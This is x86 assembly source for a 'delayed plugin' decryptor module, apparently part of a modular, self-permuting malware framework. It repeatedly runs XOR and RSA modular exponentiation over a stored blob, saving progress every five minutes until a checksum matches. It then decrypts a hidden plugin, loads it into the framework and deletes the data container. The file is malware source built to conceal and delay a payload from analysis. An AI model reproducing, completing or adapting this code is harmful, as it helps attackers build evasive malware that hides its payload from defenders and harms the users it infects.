   ; DPGN
   ; ~~~~
   ; - "delayed plugin" decryptor

   DPGN_DATA_SIZE          equ     65536

   include                 INCLUDE\consts.inc
   include                 INCLUDE\s2c.inc
   include                 k32man.inc
   include                 r3io.inc
   include                 dpgndat.inc
   include                 memory.inc
   include                 rsalib.inc
   include                 system.inc
   include                 plugman.inc
   include                 addpgn.inc
   include                 util.inc

   include                 plugin.inc
                           PLUGIN_START    DPGN, CODE32, PERMUTABLE

   handleevent:            hookevent EV_DPGN_CYCLE, main
                           stc
                           retn

   ;----------------------------------------------------------------------------

   main:                   pusha
                           cld

   ; DPGN data container - present?
                           mov     edx, EV_DPGNDAT_BASE
                           event   EV_SYSTEM_PLUGIN_EXIST
                           jz      __error

   ; file exists?
                           mov     esi, XFILE_2
                           xor     edx, edx        ; EDX=buffer (0==do MALLOC)
                           mov     ecx, DPGN_DATA_SIZE  ; ECX=buffer size
                           event   EV_UTIL_BLOAD_EX
                           or      eax, eax
                           jnz     __havedata

                           call    create
   __havedata:

   ; EDX = decrypted DPGN stuff (see DPGNDAT1.INC for details)

   ; EDI = current time [ms]
                           event   EV_UTIL_GETTIME
                           xchg    edi, eax
   __cycle:

   ; calculate checksum of the current 'hash' buffer
                           lea     esi, [edx+12]   ; rsa_x
                           mov     ecx, [edx+0]    ; keylen
                           call    calc_hash

                           cmp     eax, [edx+8]    ; checksum
                           je      __success

   ; þ decrypt 1 time

   ; xorcrypt
                           mov     ecx, [edx+0]    ; keylen
                           lea     esi, [edx+12]   ; rsa_x
                           call    xorcrypt
   ; modexp

                           sub     esp, 512
                           mov     ebx, esp

                           mov     ecx, [edx+0]    ; keylen
                           push    ecx             ; key length, in BITs
                           shr     ecx, 3
                           lea     eax, [edx+12]   ; rsa_x
                           push    eax             ; input
                           push    ebx             ; output
                           add     eax, ecx
                           push    eax             ; e
                           add     eax, ecx
                           push    eax             ; n
                           pusha
                           lea     edx, [esp+32]
                           event   EV_RSALIB_MODEXP
                           popa
                           add     esp, 5*4

                           mov     esi, esp
                           lea     edi, [edx+12]   ; rsa_x
                           mov     ecx, [edx+0]    ; keylen
                           shr     ecx, 5
                           rep     movsd

                           add     esp, 512

                           event   EV_UTIL_GETTIME
                           sub     eax, edi
                           cmp     eax, 5*60*1000    ; 5 min
                           jb      __cycle

                           call    __saveit

   __exit_ok:              event   EV_MEMORY_MFREE

                           clc
                           jmp     __quit
   __error:                stc
   __quit:                 popa
                           retn

   __saveit:               mov     esi, XFILE_2
                           mov     ecx, DPGN_DATA_SIZE     ; ECX=bufsize
                           event   EV_UTIL_BSAVE_EX
                           retn

   __success:              call    __saveit

                           mov     ecx, [edx+0]    ; keylen
                           shr     ecx, 3
                           lea     esi, [edx+12]   ; rsa_x
                           lea     edi, [esi+ecx*4]  ; EDI<--data
                           sub     edi, ecx
                           mov     ebx, [edx+4]    ; datasize
                           shl     ecx, 3
                           call    decr_data

   ; add plugin
                           mov     esi, edi
                           mov     ecx, [edx+4]    ; datasize
                           event   EV_ADDPGN_ADD_PGN_BUF

                           pusha
                           mov     edx, EV_DPGNDAT_BASE
                           event   EV_PLUGMAN_REMOVE
                           popa

                           jmp     __exit_ok

   ;----------------------------------------------------------------------------

   ; output: CF=0 -- EDX=data
   ;         CF=1 -- error

   create:                 pusha

                           mov     ecx, DPGN_DATA_SIZE
                           event   EV_MEMORY_MALLOC
                           mov     [esp].popa_edx, edx

                           mov     edi, edx
                           event   EV_DPGNDAT_GETDATA

                           clc

                           popa
                           retn

   ;----------------------------------------------------------------------------

   include                 rsacrypt\dpgnhash\dpgn1.inc
   include                 rsacrypt\dpgn\dpgn2.inc

   ;----------------------------------------------------------------------------

                           PLUGIN_END
